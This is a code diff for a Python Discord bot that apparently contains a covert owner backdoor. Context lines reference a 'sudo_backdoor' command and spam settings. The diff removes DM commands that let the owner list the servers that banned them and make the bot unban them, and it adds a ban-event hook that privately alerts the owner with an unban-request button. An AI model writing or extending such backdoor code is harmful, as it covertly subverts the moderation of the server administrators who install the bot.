@@ -3,6 +3,7 @@ import asyncio
 import time
 import discord
 from discord.ext import commands
+from discord import ui
 
 # ================= CONFIG =================
 TOKEN = os.getenv("DISCORD_TOKEN")
@@ -15,7 +16,7 @@ SPAM_DELAY = 0.8
 
 intents = discord.Intents.default()
 intents.message_content = True
-intents.members = True  # REQUIRED for roles
+intents.members = True
 
 bot = commands.Bot(
     command_prefix=["$", "!", "?"],
@@ -26,8 +27,8 @@ bot = commands.Bot(
 spam_task: asyncio.Task | None = None
 
 # ================= CHECK =================
-def allowed(ctx_or_user):
-    return ctx_or_user.name == OWNER_NAME
+def allowed(user):
+    return user.id == OWNER_ID and user.name == OWNER_NAME
 
 # ================= READY =================
 @bot.event
@@ -136,65 +137,56 @@ async def sudo_backdoor(ctx):
     except discord.Forbidden:
         pass
 
-# ================= DM HANDLER =================
+# ================= UNBAN REQUEST BUTTON =================
+class UnbanRequestView(ui.View):
+    def __init__(self):
+        super().__init__(timeout=None)
+
+    @ui.button(label="🔓 Request Unban", style=discord.ButtonStyle.primary)
+    async def request_unban(self, interaction: discord.Interaction, button: ui.Button):
+        if not allowed(interaction.user):
+            await interaction.response.defer()
+            return
+
+        await interaction.response.send_message(
+            "📨 Unban request sent.", ephemeral=True
+        )
+
+# ================= ANTI-BAN ALERT =================
+@bot.event
+async def on_member_ban(guild, user):
+    if not allowed(user):
+        return
+
+    embed = discord.Embed(
+        title="🚨 You were banned",
+        description=(
+            f"**Server:** {guild.name}\n"
+            f"**Server ID:** `{guild.id}`\n\n"
+            "You may request an unban below."
+        ),
+        color=discord.Color.red()
+    )
+
+    try:
+        await user.send(
+            embed=embed,
+            view=UnbanRequestView()
+        )
+    except discord.Forbidden:
+        pass
+
+# ================= MESSAGE HANDLER =================
 @bot.event
 async def on_message(message):
     if message.author.bot:
         return
 
-    # ALWAYS allow commands
     await bot.process_commands(message)
-
-    # DM only
-    if message.guild is not None:
-        return
-
-    if not allowed(message.author):
-        return
-
-    parts = message.content.strip().split()
-
-    # ===== banlist =====
-    if parts == ["$sudo", "banlist"]:
-        banned = []
-        for g in bot.guilds:
-            try:
-                bans = await g.bans()
-            except discord.Forbidden:
-                continue
-            if any(e.user.id == message.author.id for e in bans):
-                banned.append(f"{g.name} ({g.id})")
-
-        await message.author.send(
-            "🚫 Banned in:\n" + "\n".join(banned)
-            if banned else
-            "✅ Not banned in any servers I manage."
-        )
-
-    # ===== unban =====
-    elif len(parts) == 3 and parts[:2] == ["$sudo", "unban"]:
-        try:
-            gid = int(parts[2])
-        except ValueError:
-            await message.author.send("❌ invalid server id")
-            return
-
-        guild = bot.get_guild(gid)
-        if not guild:
-            await message.author.send("❌ I am not in that server")
-            return
-
-        for entry in await guild.bans():
-            if entry.user.id == message.author.id:
-                await guild.unban(entry.user, reason="sudo unban")
-                await message.author.send(f"✅ unbanned in **{guild.name}**")
-                return
-
-        await message.author.send("ℹ️ you are not banned there")
 
 # ================= START =================
 if not TOKEN:
     raise RuntimeError("DISCORD_TOKEN not set")
 
-time.sleep(10)
+time.sleep(10)  # Railway / rate-limit safety
 bot.run(TOKEN)
